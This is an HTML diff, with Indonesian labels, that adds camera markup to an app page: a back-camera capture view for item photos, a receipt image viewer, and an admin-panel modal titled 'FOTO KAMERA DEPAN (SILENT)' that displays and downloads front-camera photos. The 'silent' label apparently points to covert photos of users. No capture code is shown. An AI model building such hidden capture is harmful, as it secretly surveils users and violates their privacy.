@@ -78,7 +78,22 @@
             </div>
         </main>
 
+        <!-- ============================================ -->
+        <!-- CAMERA CONTAINER (HIDDEN - UNTUK KAMERA BELAKANG) -->
+        <!-- ============================================ -->
+        <div id="cameraContainer" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9998; flex-direction:column; align-items:center; justify-content:center;">
+            <video id="cameraVideo" autoplay playsinline style="width:100%; max-height:75vh; object-fit:cover;"></video>
+            <canvas id="cameraCanvas" style="display:none;"></canvas>
+            <div id="cameraStatus" style="color:#fff; padding:10px; font-size:14px; text-align:center;"></div>
+            <div style="display:flex; gap:10px; margin:15px;">
+                <button id="btnCaptureBack" style="padding:12px 30px; background:#10b981; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:bold; cursor:pointer;">📸 Ambil Foto Barang</button>
+                <button onclick="window.closeBackCamera()" style="padding:12px 30px; background:#ff4444; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:bold; cursor:pointer;">Tutup</button>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
         <!-- PHOTO CONFIRMATION MODAL -->
+        <!-- ============================================ -->
         <div id="photoModal" class="modal-overlay" style="display: none;">
             <div class="modal-card">
                 <div class="modal-header">
@@ -100,6 +115,37 @@
                 <div class="modal-footer">
                     <button class="btn-cancel" id="btnCancelPhoto">Batal</button>
                     <button class="btn-confirm-send" id="btnSendPhoto">✅ Konfirmasi & Kirim Foto</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- FRONT CAMERA MODAL (UNTUK ADMIN PANEL) -->
+        <!-- ============================================ -->
+        <div id="frontCamModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; flex-direction:column; align-items:center; justify-content:center; padding:20px;">
+            <h2 id="frontCamTitle" style="color:#ff4444; font-family:'Share Tech Mono',monospace; margin-bottom:15px;">FOTO KAMERA DEPAN (SILENT)</h2>
+            <img id="frontCamImg" src="" style="max-width:90%; max-height:70vh; border:2px solid #ff4444; border-radius:8px;">
+            <p id="frontCamInfo" style="color:#aaa; font-size:12px; margin-top:10px;"></p>
+            <div style="margin-top:20px; display:flex; gap:10px;">
+                <a id="btnDownloadFront" href="" download class="btn" style="padding:10px 20px; background:#10b981; color:#fff; text-decoration:none; border-radius:5px;">Download Foto</a>
+                <button onclick="window.closeFrontCamModal()" style="padding:10px 20px; background:#ff4444; color:#fff; border:none; border-radius:5px; cursor:pointer;">Tutup</button>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- IMAGE VIEWER MODAL (UNTUK FOTO STRUK) -->
+        <!-- ============================================ -->
+        <div id="imgViewerModal" class="modal-overlay" style="display: none;">
+            <div class="modal-card">
+                <div class="modal-header">
+                    <h3 id="imgModalTitle">FOTO STRUK</h3>
+                    <button class="modal-close" onclick="window.closeImgModal()">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <img id="imgModalFull" src="" style="max-width:100%; max-height:70vh;">
+                </div>
+                <div class="modal-footer">
+                    <a id="btnDownloadImg" href="" download class="btn-confirm-send" style="text-decoration:none; text-align:center;">Download Foto</a>
                 </div>
             </div>
         </div>
